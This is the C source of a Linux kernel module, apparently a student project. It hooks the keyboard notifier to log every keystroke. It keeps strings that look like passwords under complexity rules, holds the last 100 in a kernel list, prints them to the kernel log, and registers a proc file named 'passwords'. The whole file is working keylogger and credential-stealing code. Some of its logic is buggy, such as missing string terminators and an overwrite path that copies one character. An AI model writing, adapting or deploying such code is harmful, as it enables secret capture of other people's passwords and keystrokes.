/* What we need to do:
 * 	3. Save a password that fits #2 in a proc file called "passwords". Save
 * 	   The last 100 potential paswords. We can use a linked list type data
 * 	   structure or just allocate a ton of space in a list of char*, probably
 * 	   go with the linked list. A linked list would have bad lookup time but
 * 	   it would be in 'order' anyways with re writing the passwords after 100
 *
 * 	-  The 2d array called 'keymap' takes [keycode][shift_boolean] to retrieve
 * 	   a letter.
 *
 * */
#include "helper.h"

#define CLEAR_BUFFER(x, len) \
	for(int i=0; i<len; i++) { \
		x[i] = '\0'; \
	} \


#define PROC_FILE_NAME "passwords"

struct notifier_block nb;
int password_count;
bool overwrite = false;
struct password* HEAD = NULL;

// We want a reference to the password* head
void push(struct password** head, char* password_value){ // Probably don't need to set this as a parameter, but whatever, I like it.
        // 'current' is a macro :/
	struct password* curr;
	struct password* new_node;
	int i;
	password_count++; // TODO keep an eye on the location of this.
	
	if(!overwrite){
		// Use kfree on this bad boy
		new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
		
		for(i=0; i<strlen(password_value); i++){
			new_node->pw[i] = password_value[i];
		}
		
		printk("Password: %s\n", new_node->pw);
		new_node->overwrite_num = 1;
	        new_node->next = NULL;
        
		if(*head == NULL){
        	        *head = new_node;
        	        return;
        	}

        	curr = *head;
        	while(curr->next != NULL){
        	        curr = curr->next;
        	}
        	curr->next = new_node;

		if(password_count == 100){
			new_node->next = *head;
			overwrite = true;
		}
	
	}else{
		// Iterate until we find the next node for overwriting
		curr = *head;
		if(password_count % 100 == 1){ // Should be at head again.
			for(i=0; i<strlen(password_value); i++){
				curr->pw[i] = password_value[i];
			}
			curr->overwrite_num++;
			printk("Password: %s\n", curr->pw);
			return;
		}
		while(curr->overwrite_num == curr->next->overwrite_num){
			curr = curr->next;
		} // Brings curr to the last written node before this push call

		curr->next->pw[0] = password_value[0];
		curr->next->overwrite_num++;
	}

}

void ll_destructor(struct password** head){
	struct password* next;
	struct password* curr;
	int i;

	if(*head == NULL){
		return;
	}

	curr = *head;
	for(i=0; i<100; i++){
                next = curr->next;
                kfree(curr);
                if(next != NULL){
                        curr = next;
                }else{
			break;
		}
        }
	overwrite = false;
}

void check_pw(char* pw, int len){
	// uppercase, lowercase, number, symbol
	char rules[4] = {0, 0, 0, 0};
	char *c;
	int reject = 0;
	for(c=pw; *c ; c++){
		if(*c >= 'A' && *c <= 'Z'){
			rules[0] = 1;
		} 
		else if(*c >= 'a' && *c <= 'z'){
			rules[1] = 1;
		}
		else if(*c >= '0' && *c <= '9'){
			rules[2] = 1;
		}
		else if(isprint(*c)) { // Everything else can be a symbol
			rules[3] = 1;
		}else {
			reject = 1;
		}
	}
	if(rules[0] + rules[1] + rules[2] + rules[3] > 2 && !reject){ // At least 3 are correct
		push(&HEAD, pw);
		printk("PUSHING\n");
	}
}


ssize_t read_password(struct file *filp, char *buf, size_t count, loff_t *offp ) {
	size_t comp = 0;
	if(HEAD == NULL){
		return 0;
	}
	struct password* curr = HEAD;
       	while(curr != NULL){
		printk("%s\n", curr->pw);
		if(curr->next == NULL) break;
		curr = curr->next;
	}

	*offp = comp;
	return comp;
}

struct proc_ops proc_fops = {
	proc_read: read_password,
};
//doesn't like when it gets to the limit here
char pw_buffer[16];

int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
	int len;
	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
	
	if(kp->value > 57 || kp->value == 54 || kp->value == 42 || kp->value == 14) return 0; // The shifts and back space

	if(kp->down){
		len = strlen(pw_buffer);
		//printk("length of the buffer: %d\n", len);
		if(len == 15 || kp->value == 57 || kp->value == 28 || kp->value == 15){ // reset it on a space and newline as well
			check_pw(pw_buffer, len);
			CLEAR_BUFFER(pw_buffer, len);
			if(kp->value == 57 || kp->value == 28 || kp->value == 15) return 0; // return if it's a non character
			len = 0; // We have a new password entry from here
		}
		pw_buffer[len] = *keymap[kp->value][kp->shift];
	}

	return 0;
}

int init (void) {
	password_count = 0;
	
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	ll_destructor(&HEAD);
	remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);

